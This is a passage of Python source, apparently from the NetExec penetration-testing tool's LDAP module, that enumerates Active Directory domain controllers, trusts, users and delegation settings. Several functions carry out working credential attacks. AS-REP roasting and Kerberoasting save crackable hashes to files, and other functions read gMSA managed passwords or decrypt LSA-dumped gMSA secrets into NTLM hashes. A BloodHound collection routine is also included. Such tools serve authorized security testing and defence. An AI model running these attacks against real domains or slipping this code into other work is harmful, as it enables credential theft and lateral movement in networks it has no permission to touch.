                self.logger.fail(f"Skipping item(dNSHostName) {prefix}{name}, error: {e}")

        # Find all domain controllers in the current domain
        self.logger.info("Enumerating Domain Controllers in current domain...")
        search_filter = "(&(objectCategory=computer)(primaryGroupId=516))"
        attributes = ["dNSHostName"]
        resp = self.search(search_filter, attributes)
        resp_parse = parse_result_attributes(resp)
        for item in resp_parse:
            if "dNSHostName" in item:  # Get dNSHostName attribute
                name = item["dNSHostName"]
                resolve_and_display_hostname(name)

        # Find all trusted domains
        self.logger.info("Enumerating Trusted Domains...")
        search_filter = "(objectClass=trustedDomain)"
        attributes = ["name", "trustDirection", "trustType", "trustAttributes", "flatName"]
        resp = self.search(search_filter, attributes, 0)
        trust_resp_parse = parse_result_attributes(resp)

        for trust in trust_resp_parse:
            try:
                trust_name = trust["name"]
                trust_flat_name = trust["flatName"]
                trust_direction = int(trust["trustDirection"])
                trust_type = int(trust["trustType"])
                trust_attributes = int(trust["trustAttributes"])

                # See: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c
                trust_attribute_flags = {
                    0x1:    "Non-Transitive",
                    0x2:    "Uplevel-Only",
                    0x4:    "Quarantined Domain",
                    0x8:    "Forest Transitive",
                    0x10:   "Cross Organization",
                    0x20:   "Within Forest",
                    0x40:   "Treat as External",
                    0x80:   "Uses RC4 Encryption",
                    0x200:  "Cross Organization No TGT Delegation",
                    0x800:  "Cross Organization Enable TGT Delegation",
                    0x2000: "PAM Trust"
                }

                # For check if multiple posibble flags, like Uplevel-Only, Treat as External
                trust_attributes_text = ", ".join(
                    text for flag, text in trust_attribute_flags.items()
                    if trust_attributes & flag
                ) or "Other"  # If Trust attrs not known

                # Convert trust direction/type to human-readable format
                direction_text = {
                    0: "Disabled",
                    1: "Inbound",
                    2: "Outbound",
                    3: "Bidirectional",
                }[trust_direction]

                trust_type_text = {
                    1: "Windows NT",
                    2: "Active Directory",
                    3: "Kerberos",
                    4: "Unknown",
                    5: "Azure Active Directory",
                }[trust_type]

                self.logger.info(f"Processing trusted domain: {trust_name} ({trust_flat_name})")
                self.logger.info(f"Trust type: {trust_type_text}, Direction: {direction_text}, Trust Attributes: {trust_attributes_text}")

            except Exception as e:
                self.logger.fail(f"Failed {e} in trust entry: {trust}")

            # Only process if it's an Active Directory trust
            if int(trust_type) == 2:
                # Try to find domain controllers in trusted domain using DNS
                # Check if we can resolve the trusted domain's DC using DNS
                dc_dns_name = f"_ldap._tcp.dc._msdcs.{trust_name}"
                try:
                    srv_records = resolv.resolve(dc_dns_name, "SRV", tcp=self.args.dns_tcp)
                    self.logger.info(f"Found domain controllers for trusted domain {trust_name} via DNS:")
                    for srv in srv_records:
                        dc_hostname = str(srv.target).rstrip(".")
                        self.logger.success(f"Found DC in trusted domain: {colored(dc_hostname, host_info_colors[0], attrs=['bold'])}")
                        self.logger.highlight(f"{trust_name} -> {direction_text} -> {trust_attributes_text}")
                        resolve_and_display_hostname(dc_hostname)
                except Exception as e:
                    self.logger.fail(f"Failed to resolve DCs for {trust_name} via DNS: {e}")
            else:
                self.logger.display(f"Skipping non-Active Directory trust '{trust_name}' with type: {trust_type_text} and direction: {direction_text}")
        self.logger.info("Domain Controller enumeration complete.")

    def active_users(self):
        if len(self.args.active_users) > 0:
            self.logger.debug(f"Dumping users: {', '.join(self.args.active_users)}")
            search_filter = f"(|{''.join(f'(sAMAccountName={user})' for user in self.args.active_users)})"
        else:
            self.logger.debug("Trying to dump all users")
            search_filter = "(sAMAccountType=805306368)"

        # Default to these attributes to mirror the SMB --users functionality
        request_attributes = ["sAMAccountName", "description", "badPwdCount", "pwdLastSet", "userAccountControl"]
        resp = self.search(search_filter, request_attributes, sizeLimit=0)

        if resp:
            all_users = parse_result_attributes(resp)
            # Filter disabled users (ignore accounts without userAccountControl value)
            active_users = [user for user in all_users if not (int(user.get("userAccountControl", UF_ACCOUNTDISABLE)) & UF_ACCOUNTDISABLE)]

            self.logger.display(f"Total records returned: {len(all_users)}, total {len(all_users) - len(active_users):d} user(s) disabled")
            self.logger.highlight(f"{'-Username-':<30}{'-Last PW Set-':<20}{'-BadPW-':<9}{'-Description-':<60}")

            for user in active_users:
                pwd_last_set = user.get("pwdLastSet", "")
                if pwd_last_set:
                    pwd_last_set = "<never>" if pwd_last_set == "0" else datetime.fromtimestamp(self.getUnixTime(int(pwd_last_set))).strftime("%Y-%m-%d %H:%M:%S")
                self.logger.highlight(f"{user.get('sAMAccountName', ''):<30}{pwd_last_set:<20}{user.get('badPwdCount', ''):<9}{user.get('description', '')}")

    def asreproast(self):
        # Building the search filter
        search_filter = f"(&(UserAccountControl:1.2.840.113556.1.4.803:={UF_DONT_REQUIRE_PREAUTH})(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE}))(!(objectCategory=computer)))"
        resp = self.search(search_filter, attributes=["sAMAccountName"], sizeLimit=0)
        resp_parsed = parse_result_attributes(resp)
        if not resp_parsed:
            self.logger.highlight("No entries found!")
        else:
            self.logger.display(f"Total of records returned {len(resp_parsed)}")
            for user in resp_parsed:
                hash_TGT = KerberosAttacks(self).get_tgt_asroast(user["sAMAccountName"])
                if hash_TGT:
                    self.logger.highlight(f"{hash_TGT}")
                    with open(self.args.asreproast, "a+") as hash_asreproast:
                        hash_asreproast.write(f"{hash_TGT}\n")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
        attributes = [
            "sAMAccountName",
            "userAccountControl",
            "servicePrincipalName",
            "MemberOf",
            "pwdLastSet",
            "lastLogon",
        ]
        resp = self.search(searchFilter, attributes, 0)
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Search Filter: {searchFilter}")
        self.logger.debug(f"Attributes: {attributes}")
        self.logger.debug(f"Response: {resp_parsed}")

        if not resp_parsed:
            self.logger.highlight("No entries found!")
        else:
            # Filter disabled accounts
            disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
            for account in disabled_accounts:
                self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")

            # Get all enabled accounts
            enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
            self.logger.display(f"Total of records returned {len(enabled):d}")

            for user in enabled:
                # Perform Kerberos Attack
                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                self.logger.debug(f"TGT: {TGT}")
                if TGT:
                    downLevelLogonName = f"{self.targetDomain}\\{user['sAMAccountName']}"
                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                            principalName,
                            self.domain,
                            self.kdcHost,
                            TGT["KDC_REP"],
                            TGT["cipher"],
                            TGT["sessionKey"],
                        )
                        out = KerberosAttacks(self).output_tgs(
                            tgs,
                            oldSessionKey,
                            sessionKey,
                            user["sAMAccountName"],
                            downLevelLogonName,
                        )

                        pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
                        lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
                        self.logger.display(f"sAMAccountName: {user['sAMAccountName']}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
                        self.logger.highlight(f"{out}")
                        if self.args.kerberoasting:
                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                hash_kerberoasting.write(out + "\n")
                    except Exception as e:
                        self.logger.debug(f"Exception: {e}", exc_info=True)
                        self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                else:
                    self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")

    def query(self):
        """
        Query the LDAP server with the specified filter and attributes.
        Example usage:
            --query "(sAMAccountName=Administrator)" "sAMAccountName pwdLastSet memberOf"
        """
        search_filter = self.args.query[0]
        attributes = [attr.strip() for attr in self.args.query[1].split(" ")]
        if len(attributes) == 1 and attributes[0] == "":
            attributes = None
        if not search_filter:
            self.logger.fail("No filter specified")
            return
        self.logger.debug(f"Querying LDAP server with filter: {search_filter} and attributes: {attributes}")
        try:
            resp = self.search(search_filter, attributes, 0)
            resp_parsed = parse_result_attributes(resp)
        except LDAPFilterSyntaxError as e:
            self.logger.fail(f"LDAP Filter Syntax Error: {e}")
            return
        for idx, entry in enumerate(resp_parsed):
            if not isinstance(resp[idx], ldapasn1_impacket.SearchResultEntry):
                idx += 1  # Skip non-entry responses
            self.logger.success(f"Response for object: {resp[idx]['objectName']}")
            for attribute in entry:
                if isinstance(entry[attribute], list) and entry[attribute]:
                    # Display first item in the same line as attribute
                    self.logger.highlight(f"{attribute:<20} {entry[attribute].pop(0)}")
                    for item in entry[attribute]:
                        self.logger.highlight(f"{'':<20} {item}")
                else:
                    self.logger.highlight(f"{attribute:<20} {entry[attribute]}")

    def find_delegation(self):
        def printTable(items, header):
            colLen = []

            # Calculating maximum lenght before parsing CN.
            for i, col in enumerate(header):
                rowMaxLen = max(len(row[1].split(",")[0].split("CN=")[-1]) for row in items) if i == 1 else max(len(str(row[i])) for row in items)
                colLen.append(max(rowMaxLen, len(col)))

            # Create the format string for each row
            outputFormat = " ".join([f"{{{num}:{width}s}}" for num, width in enumerate(colLen)])

            # Print header
            self.logger.highlight(outputFormat.format(*header))
            self.logger.highlight(" ".join(["-" * itemLen for itemLen in colLen]))

            # Print rows
            for row in items:
                # Get first CN value.
                if "CN=" in row[1]:
                    row[1] = row[1].split(",")[0].split("CN=")[-1]

                # Added join for DelegationRightsTo
                row[3] = ", ".join(str(x) for x in row[3]) if isinstance(row[3], list) else row[3]

                self.logger.highlight(outputFormat.format(*row))

        # Building the search filter
        search_filter = (f"(&(|(UserAccountControl:1.2.840.113556.1.4.803:={UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION})"
                         f"(UserAccountControl:1.2.840.113556.1.4.803:={UF_TRUSTED_FOR_DELEGATION})"
                         "(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))"
                         f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))")
        # f"(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_SERVER_TRUST_ACCOUNT})))")  This would filter out RBCD to DCs

        attributes = ["sAMAccountName", "pwdLastSet", "userAccountControl", "objectCategory", "msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-AllowedToDelegateTo"]

        resp = self.search(search_filter, attributes)
        answers = []
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Total of records returned {len(resp_parsed)}")

        for item in resp_parsed:
            sAMAccountName = ""
            userAccountControl = 0
            delegation = ""
            objectType = ""
            rightsTo = []
            protocolTransition = 0

            try:
                sAMAccountName = item["sAMAccountName"]

                userAccountControl = int(item["userAccountControl"])
                objectType = item.get("objectCategory")

                # Filter out DCs, unconstrained delegation to DCs is not a useful information
                if userAccountControl & UF_TRUSTED_FOR_DELEGATION and not userAccountControl & UF_SERVER_TRUST_ACCOUNT:
                    delegation = "Unconstrained"
                    rightsTo.append("N/A")
                elif userAccountControl & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                    delegation = "Constrained w/ Protocol Transition"
                    protocolTransition = 1

                if item.get("msDS-AllowedToDelegateTo") is not None:
                    if protocolTransition == 0:
                        delegation = "Constrained"
                    rightsTo = item.get("msDS-AllowedToDelegateTo")

                # Not an elif as an object could both have RBCD and another type of delegation
                if item.get("msDS-AllowedToActOnBehalfOfOtherIdentity") is not None:
                    databyte = item.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
                    rbcdRights = []
                    rbcdObjType = []
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(databyte))
                    if len(sd["Dacl"].aces) > 0:
                        search_filter = "(&(|"
                        for ace in sd["Dacl"].aces:
                            search_filter += "(objectSid=" + ace["Ace"]["Sid"].formatCanonical() + ")"
                        search_filter += f")(!(UserAccountControl:1.2.840.113556.1.4.803:={UF_ACCOUNTDISABLE})))"
                        delegUserResp = self.search(search_filter, attributes=["sAMAccountName", "objectCategory"])
                        delegUserResp_parse = parse_result_attributes(delegUserResp)

                        for rbcd in delegUserResp_parse:
                            rbcdRights.append(str(rbcd.get("sAMAccountName")))
                            rbcdObjType.append(str(rbcd.get("objectCategory")))

                        for rights, objType in zip(rbcdRights, rbcdObjType, strict=True):
                            answers.append([rights, objType, "Resource-Based Constrained", sAMAccountName])

                if delegation in ["Unconstrained", "Constrained", "Constrained w/ Protocol Transition"]:
                    answers.append([sAMAccountName, objectType, delegation, rightsTo])

            except Exception as e:
                self.logger.error(f"Skipping item, cannot process due to error {e}")

        if answers:
            printTable(answers, header=["AccountName", "AccountType", "DelegationType", "DelegationRightsTo"])
        else:
            self.logger.fail("No entries found!")

    def trusted_for_delegation(self):
        # Building the search filter
        searchFilter = f"(userAccountControl:1.2.840.113556.1.4.803:={UF_TRUSTED_FOR_DELEGATION})"
        resp = self.search(searchFilter, attributes=["sAMAccountName"], sizeLimit=0)
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Total of records returned {len(resp_parsed):d}")

        if resp_parsed:
            for item in resp_parsed:
                self.logger.highlight(item["sAMAccountName"])
        else:
            self.logger.fail("No entries found!")

    def password_not_required(self):
        # Building the search filter
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=32)"
        attributes = [
            "sAMAccountName",
            "userAccountControl",
        ]
        resp = self.search(searchFilter, attributes, sizeLimit=0, baseDN=self.baseDN)
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Total of records returned {len(resp_parsed):d}")

        if resp_parsed:
            for user in resp_parsed:
                status = "disabled" if int(user["userAccountControl"]) & 2 else "enabled"
                self.logger.highlight(f"User: {user['sAMAccountName']} Status: {status}")
        else:
            self.logger.fail("No entries found!")

    def admin_count(self):
        # Building the search filter
        resp = self.search(searchFilter="(&(adminCount=1)(objectClass=user))", attributes=["sAMAccountName"], sizeLimit=0)
        resp_parsed = parse_result_attributes(resp)
        self.logger.debug(f"Total of records returned {len(resp_parsed):d}")

        if resp_parsed:
            for user in resp_parsed:
                self.logger.highlight(user["sAMAccountName"])
        else:
            self.logger.fail("No entries found!")

    def gmsa(self):
        self.logger.display("Getting GMSA Passwords")
        search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
        gmsa_accounts = self.ldap_connection.search(
            searchBase=self.baseDN,
            searchFilter=search_filter,
            attributes=[
                "sAMAccountName",
                "msDS-ManagedPassword",
                "msDS-GroupMSAMembership",
            ],
            sizeLimit=0,
        )
        gmsa_accounts_parsed = parse_result_attributes(gmsa_accounts)
        if gmsa_accounts_parsed:
            self.logger.debug(f"Total of records returned {len(gmsa_accounts_parsed):d}")

            for acc in gmsa_accounts_parsed:
                # PrincipalAllowedToRetrieveGMSAPassword
                principal_with_read = []
                if "msDS-GroupMSAMembership" in acc:
                    msDS_GroupMSAMembership = acc["msDS-GroupMSAMembership"]
                    dacl = ldaptypes.SR_SECURITY_DESCRIPTOR(data=bytes(msDS_GroupMSAMembership))

                    # Get all SIDs that have the right to read the password
                    sids = [ace["Ace"]["Sid"].formatCanonical() for ace in dacl["Dacl"]["Data"] if ace["AceType"] == 0x00]
                    self.logger.debug(f"msDS-GroupMSAMembership: {sids}")
                    search_filter = "(|" + "".join([f"(objectSid={sid})" for sid in sids]) + ")"
                    resp = self.ldap_connection.search(
                        searchBase=self.baseDN,
                        searchFilter=search_filter,
                        attributes=["sAMAccountName"],
                        sizeLimit=0,
                    )
                    resp_parsed = parse_result_attributes(resp)
                    if len(resp_parsed) > 1:
                        principal_with_read = [f"{item['sAMAccountName']}" for item in resp_parsed]
                    elif len(resp_parsed) == 1:
                        principal_with_read = resp_parsed[0]["sAMAccountName"]

                # Get the password
                passwd = "<no read permissions>"
                if "msDS-ManagedPassword" in acc:
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(acc["msDS-ManagedPassword"])
                    currentPassword = blob["CurrentPassword"][:-2]
                    ntlm_hash = MD4.new()
                    ntlm_hash.update(currentPassword)
                    passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {acc['sAMAccountName']:<20} NTLM: {passwd:<36} PrincipalsAllowedToReadPassword: {principal_with_read}")
        return True

    def decipher_gmsa_name(self, domain_name=None, account_name=None):
        # https://aadinternals.com/post/gmsa/
        gmsa_account_name = (domain_name + account_name).upper()
        self.logger.debug(f"GMSA name for {gmsa_account_name}")
        bin_account_name = gmsa_account_name.encode("utf-16le")
        bin_hash = hmac.new(bytes("", "latin-1"), msg=bin_account_name, digestmod=hashlib.sha256).digest()
        hex_letters = "0123456789abcdef"
        str_hash = ""
        for b in bin_hash:
            str_hash += hex_letters[b & 0x0F]
            str_hash += hex_letters[b >> 0x04]
        self.logger.debug(f"Hash2: {str_hash}")
        return str_hash

    def gmsa_convert_id(self):
        if self.args.gmsa_convert_id:
            if len(self.args.gmsa_convert_id) != 64:
                self.logger.fail("Length of the gmsa id not correct :'(")
            else:
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                )
                gmsa_accounts_parsed = parse_result_attributes(gmsa_accounts)
                if gmsa_accounts_parsed:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts_parsed):d}")

                    for acc in gmsa_accounts_parsed:
                        if self.decipher_gmsa_name(self.domain.split(".")[0], acc["sAMAccountName"][:-1]) == self.args.gmsa_convert_id:
                            self.logger.highlight(f"Account: {acc['sAMAccountName']:<20} ID: {self.args.gmsa_convert_id}")
                            break
        else:
            self.logger.fail("No string provided :'(")

    def gmsa_decrypt_lsa(self):
        if self.args.gmsa_decrypt_lsa:
            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
                gmsa_id, gmsa_pass = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
                # getting the gmsa account
                search_filter = "(objectClass=msDS-GroupManagedServiceAccount)"
                gmsa_accounts = self.ldap_connection.search(
                    searchBase=self.baseDN,
                    searchFilter=search_filter,
                    attributes=["sAMAccountName"],
                    sizeLimit=0,
                )
                gmsa_accounts_parsed = parse_result_attributes(gmsa_accounts)
                if gmsa_accounts_parsed:
                    self.logger.debug(f"Total of records returned {len(gmsa_accounts):d}")

                    for acc in gmsa_accounts_parsed:
                        if self.decipher_gmsa_name(self.domain.split(".")[0], acc["sAMAccountName"][:-1]) == gmsa_id:
                            gmsa_id = acc["sAMAccountName"]
                            break
                # convert to ntlm
                data = bytes.fromhex(gmsa_pass)
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob["CurrentPassword"][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                self.logger.highlight(f"Account: {gmsa_id:<20} NTLM: {passwd}")
        else:
            self.logger.fail("No string provided :'(")

    def bloodhound(self):
        # Check which version is desired
        use_bhce = self.config.getboolean("BloodHound-CE", "bhce_enabled", fallback=False)
        package_name, version, is_ce = get_bloodhound_info()

        if use_bhce and not is_ce:
            self.logger.fail("⚠️  Configuration Issue Detected ⚠️")
            self.logger.fail("Your configuration has BloodHound-CE enabled, but the regular BloodHound package is installed. Modify your ~/.nxc/nxc.conf config file or follow the instructions:")
            self.logger.fail("Please run the following commands to fix this:")
            self.logger.fail("poetry remove bloodhound-ce   # poetry falsely recognizes bloodhound-ce as a the old bloodhound package")
            self.logger.fail("poetry add bloodhound-ce")
            self.logger.fail("")

            # If using pipx
            self.logger.fail("Or if you installed with pipx:")
            self.logger.fail("pipx runpip netexec uninstall -y bloodhound")
            self.logger.fail("pipx inject netexec bloodhound-ce --force")
            return False

        elif not use_bhce and is_ce:
            self.logger.fail("⚠️  Configuration Issue Detected ⚠️")
            self.logger.fail("Your configuration has regular BloodHound enabled, but the BloodHound-CE package is installed.")
            self.logger.fail("Please run the following commands to fix this:")
            self.logger.fail("poetry remove bloodhound-ce")
            self.logger.fail("poetry add bloodhound")
            self.logger.fail("")

            # If using pipx
            self.logger.fail("Or if you installed with pipx:")
            self.logger.fail("pipx runpip netexec uninstall -y bloodhound-ce")
            self.logger.fail("pipx inject netexec bloodhound --force")
            return False

        auth = ADAuthentication(
            username=self.username,
            password=self.password,
            domain=self.domain,
            lm_hash=self.nthash,
            nt_hash=self.nthash,
            aeskey=self.aesKey,
            kdc=self.kdcHost,
            auth_method="auto",
        )
        ad = AD(
            auth=auth,
            domain=self.domain,
            nameserver=self.args.dns_server,
            dns_tcp=self.args.dns_tcp,
            dns_timeout=self.args.dns_timeout,
        )
        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
        if not collect:
            return None
        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))

        self.logger.debug("Using DNS to retrieve domain information")
        ad.dns_resolve(domain=self.domain)

        if self.args.kerberos:
            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
            auth.get_tgt()
        if self.args.use_kcache:
            self.logger.highlight("Using kerberos auth from ccache")
            auth.load_ccache()

        timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
        bloodhound.connect()

        bloodhound.run(
            collect=collect,
            num_workers=10,
            disable_pooling=False,
            timestamp=timestamp,
            fileNamePrefix=self.output_filename.split("/")[-1],
            computerfile=None,
            cachefile=None,
            exclude_dcs=False,
        )

        self.output_filename += f"_{timestamp}"

        self.logger.highlight(f"Compressing output into {self.output_filename}bloodhound.zip")
        list_of_files = os.listdir(os.getcwd())
        with ZipFile(self.output_filename + "bloodhound.zip", "w") as z:
            for each_file in list_of_files:
                if each_file.startswith(self.output_filename.split("/")[-1]) and each_file.endswith("json"):
                    z.write(each_file)
                    os.remove(each_file)
